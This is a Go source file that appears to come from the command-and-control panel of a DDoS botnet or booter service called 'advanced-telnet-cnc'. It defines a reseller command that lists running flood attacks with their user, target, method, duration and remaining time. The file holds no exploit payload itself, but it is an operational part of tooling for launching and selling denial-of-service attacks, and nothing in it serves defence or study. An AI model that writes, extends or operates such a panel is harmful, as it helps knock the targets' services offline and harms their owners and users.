package admin

import (
	"advanced-telnet-cnc/packages/simpletable"
	"advanced-telnet-cnc/source/database"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"fmt"
	"strings"
	"time"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"running", "ongoing"},
		Description: "Displays a list of all ongoing attacks.",
		Admin:       false,
		Reseller:    true,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			floods, err := database.RunningAttacks()
			if err != nil {
				return err
			}

			if len(floods) == 0 {
				return session.Println("No attacks currently running.")
			}

			table := simpletable.New()
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "User"},
					{Align: simpletable.AlignCenter, Text: "Target"},
					{Align: simpletable.AlignCenter, Text: "Method"},
					{Align: simpletable.AlignCenter, Text: "Duration"},
					{Align: simpletable.AlignCenter, Text: "Ends In"},
				},
			}

			for i, row := range floods {
				user, err2 := database.UserFromId(row.UserId)
				if err2 != nil {
					continue
				}

				if user == nil {
					continue
				}

				timeLeft := time.Until(row.End).Round(time.Second)
				if timeLeft < 0 {
					timeLeft = 0
				}

				table.Body.Cells = append(table.Body.Cells, []*simpletable.Cell{
					{Text: fmt.Sprintf("%d", i+1)},
					{Text: user.Name},
					{Text: row.Target},
					{Text: row.Method},
					{Text: fmt.Sprintf("%ds", row.Duration)},
					{Text: timeLeft.String()},
				})
			}

			table.SetStyle(simpletable.StyleCompactLite)
			return session.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))
		},
	})
}
